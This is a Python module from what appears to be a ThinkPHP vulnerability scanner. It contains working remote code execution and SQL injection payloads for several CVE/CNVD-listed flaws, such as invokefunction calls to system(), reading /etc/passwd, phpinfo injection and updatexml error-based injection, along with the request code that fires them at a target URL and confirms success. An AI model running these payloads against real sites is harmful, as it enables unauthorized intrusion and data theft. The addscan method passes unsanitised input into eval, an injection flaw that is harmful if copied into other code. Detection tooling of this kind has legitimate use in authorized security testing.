#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
    ThinkPHP扫描类: 
        1. ThinkPHP5 未开启强制路由RCE
            CNVD-2018-24942
                Payload: https://bbs.zkaq.cn/t/5636.html

        2. ThinkPHP5 核心类Request远程代码执行
            CNNVD-201901-445
                Payload: https://bbs.zkaq.cn/t/5636.html

        3. ThinkPHP2.x preg_replace函数使用不当RCE
            暂无编号
                Payload: https://vulhub.org/#/environments/thinkphp/2-rce/

        4. ThinkPHP5 ids参数 sql注入漏洞
            暂无编号
                Payload: https://vulhub.org/#/environments/thinkphp/in-sqlinjection/

        5. ThinkPHP5.x 远程代码执行
            CVE-2018-1002015
                Payload: https://www.cnblogs.com/defyou/p/15762860.html

其它奇奇怪怪的Payload: https://baizesec.github.io/
'''

from lib.api.dns import dns
from lib.initial.config import config
from lib.tool.md5 import md5, random_md5
from lib.tool.logger import logger
from lib.tool.thread import thread
from lib.tool import check
from lib.tool import head
from thirdparty import requests
from time import sleep

class ThinkPHP():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'ThinkPHP'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md

        self.cnvd_2018_24942_payloads = [
            {
                'path': 'index.php?s=index/\\think\Request/input&filter[]=system&data={}'.format(self.cmd),
                'data': ''
            },
            {
                'path': 'index.php?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]={}'.format(self.cmd),
                'data': ''
            },
            {
                'path': 'index.php?s=index/\\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]={}'.format(self.cmd),
                'data': ''
            },
            {
                'path': 'index.php?s=index/\\think\\view\driver\Php/display&content=<?php phpinfo();?>',
                'data': ''
            }
        ]

        self.cnnvd_201901_445_payloads = [
            {
                'path': 'index.php?s=captcha',
                'data': '_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]={}'.format(self.cmd)
            }
        ]

        self.thinkphp_2_x_rce_payloads = [
            {
                'path': 'index.php?s=/index/index/name/$%7B@phpinfo()%7D',
                'data': ''
            }
        ]

        self.thinkphp_5_ids_sqlinject_payloads = [
            {
                'path': 'index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1',
                'data': ''
            }
        ]

        self.cve_2018_1002015_payloads = [
            {
                'path': 'index.php?s=index/\\think\\Container/invokefunction',
                'data': 'function=call_user_func_array&vars[0]=system&vars[1][]='+self.cmd,
                'headers': head.merge(self.headers, {})
            },
            {
                'path': 'index.php?s=index/\\think\\Container/invokefunction',
                'data': 'function=call_user_func_array&vars[0]=system&vars[1][]=cat /etc/passwd',
                'headers': head.merge(self.headers, {})
            },
            {
                'path': 'index.php?s=index/\\think\\Container/invokefunction',
                'data': 'function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1',
                'headers': head.merge(self.headers, {})
            }
        ]

        # * 以下payload没有找到测试环境, 所以没写poc, 哪个好心人提供一下环境QAQ
        self.thinkphp_5_options_sqlinject_payloads = [
            {
                'path': 'index?options=id)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23 **',
                'data': ''
            },
            {
                'path': 'index?options=id`)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23',
                'data': ''
            }
        ]

        self.thinkphp_5_username_sqlinject_payloads = [
            {
                'path': 'index/index/index?username[0]=inc&username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&username[2]=1 ',
                'data': ''
            },
            {
                'path': '?username[0]=point&username[1]=1&username[2]=updatexml(1,concat(0x7,user(),0x7e),1)^&username[3]=0 ',
                'data': ''
            }
        ]

        self.thinkphp_5_orderby_sqlinject_payloads = [
            {
                'path': 'index/index/index?orderby[id`|updatexml(1,concat(0x7,user(),0x7e),1)%23]=1 ',
                'data': ''
            }
        ]

        self.thinkphp_5_include_payloads = [
            {
                'path': 'index/index/index?cacheFile=1.jpg',
                'data': ''
            }
        ]

    def cnvd_2018_24942_scan(self, url):
        ''' ThinkPHP5 未开启强制路由RCE'''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'RCE'
        vul_info['vul_id'] = 'CNVD-2018-24942'
        vul_info['vul_method'] = 'GET'
        vul_info['headers'] = {}

        headers = self.headers
        headers.update(vul_info['headers'])

        for payload in self.cnvd_2018_24942_payloads:   # * Payload
            path = payload['path']                      # * Path
            data = payload['data']                      # * Data
            target = url + path                         # * Target

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                res = requests.get(
                    target, 
                    timeout=self.timeout, 
                    headers=headers, 
                    data=data, 
                    proxies=self.proxies, 
                    verify=False
                )
                logger.logging(vul_info, res.status_code, res)                        # * LOG
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            # * 判断扫描结果
            if (self.md in check.check_res(res.text, self.md) 
                or (('PHP Version' in res.text) 
                    and ('PHP License' in res.text))
            ):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Method': vul_info['vul_method'],
                    'Payload': {
                        'Url': url,
                        'Path': path
                    }
                }
                return results

    def cnnvd_201901_445_scan(self, url):
        ''' ThinkPHP5 核心类Request远程代码执行'''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'RCE'
        vul_info['vul_id'] = 'CNNVD-201901-445'
        vul_info['vul_method'] = 'POST'
        vul_info['headers'] = {}

        headers = self.headers
        headers.update(vul_info['headers'])

        for payload in self.cnnvd_201901_445_payloads:  # * Payload
            path = payload['path']                      # * Path
            data = payload['data']                      # * Data
            target = url + path                         # * Target

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                res = requests.post(
                    target, 
                    timeout=self.timeout, 
                    headers=headers, 
                    data=data, 
                    proxies=self.proxies, 
                    verify=False
                )
                logger.logging(vul_info, res.status_code, res)                        # * LOG
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            # * 判断扫描结果
            if (self.md in check.check_res(res.text, self.md)):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Payload': res
                }
                return results

    def thinkphp_2_x_rce_scan(self, url):
        ''' ThinkPHP 2.x版本中, 使用preg_replace的/e模式匹配路由; 
                导致用户的输入参数被插入双引号中执行, 造成任意代码执行漏洞; 
                ThinkPHP 3.0版本因为Lite模式下没有修复该漏洞, 也存在这个漏洞
        '''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'RCE'
        vul_info['vul_id'] = 'thinkphp-2.x-rce'
        vul_info['vul_method'] = 'GET'
        vul_info['headers'] = {}

        # headers = self.headers.copy()
        # headers.update(vul_info['headers'])

        for payload in self.thinkphp_2_x_rce_payloads:
            path = payload['path']
            data = payload['data']
            target = url + path

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                res = requests.get(
                    target, 
                    timeout=self.timeout, 
                    headers=self.headers,
                    data=data, 
                    proxies=self.proxies, 
                    verify=False
                )
                logger.logging(vul_info, res.status_code, res)                        # * LOG
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            if (('PHP Version' in res.text) and ('PHP License' in res.text)):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Method': vul_info['vul_method'],
                    'Payload': {
                        'Url': url,
                        'Path': path
                    }
                }
                return results

    def thinkphp_5_ids_sqlinject_scan(self, url):
        ''' ThinkPHP5 SQL注入漏洞&&敏感信息泄露漏洞 '''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'SQLinject'
        vul_info['vul_id'] = 'thinkphp-5-ids-sqlinject'
        vul_info['vul_method'] = 'GET'
        vul_info['headers'] = {}

        # headers = self.headers.copy()
        # headers.update(vul_info['headers'])

        for payload in self.thinkphp_5_ids_sqlinject_payloads:
            path = payload['path']
            data = payload['data']
            target = url + path

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                res = requests.get(
                    target, 
                    timeout=self.timeout, 
                    headers=self.headers,
                    data=data, 
                    proxies=self.proxies, 
                    verify=False
                )
                logger.logging(vul_info, res.status_code, res)                        # * LOG
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            if (('XPATH syntax error' in res.text) and ('Database Config' in res.text)):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Method': vul_info['vul_method'],
                    'Payload': {
                        'Url': url,
                        'Path': path
                    }
                }
                return results

    def cve_2018_1002015_scan(self, url):
        ''' ThinkPHP 5.0.23及5.1.31以下版本RCE
            ThinkPHP 5.0.x版本和5.1.x版本中存在远程代码执行漏洞, 
            该漏洞源于ThinkPHP在获取控制器名时未对用户提交的参数进行严格的过滤,
            远程攻击者可通过输入字符 \ 的方式调用任意方法利用该漏洞执行代码
        '''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'RCE'
        vul_info['vul_id'] = 'CVE-2018-1002015'
        vul_info['vul_method'] = 'POST'

        for payload in self.cve_2018_1002015_payloads:
            path = payload['path']
            data = payload['data']
            headers = payload['headers']
            target = url + path

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['headers'] = headers
            vul_info['target'] = target

            try:
                res = requests.post(
                    target, 
                    timeout=self.timeout, 
                    headers=headers,
                    data=data, 
                    proxies=self.proxies, 
                    verify=False
                )
                logger.logging(vul_info, res.status_code, res)                        # * LOG
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            if (('root:x:0:0:root' in res.text) 
                or (self.md in check.check_res(res.text, self.md))
                or (('PHP Version' in res.text) 
                    and ('PHP License' in res.text))
            ):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Payload': res
                }
                return results

    def addscan(self, url, vuln=None):
        if vuln:
            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))

        return [
            thread(target=self.cnvd_2018_24942_scan, url=url),
            thread(target=self.cnnvd_201901_445_scan, url=url),
            thread(target=self.thinkphp_2_x_rce_scan, url=url),
            thread(target=self.thinkphp_5_ids_sqlinject_scan, url=url),
            thread(target=self.cve_2018_1002015_scan, url=url)
        ]

thinkphp = ThinkPHP()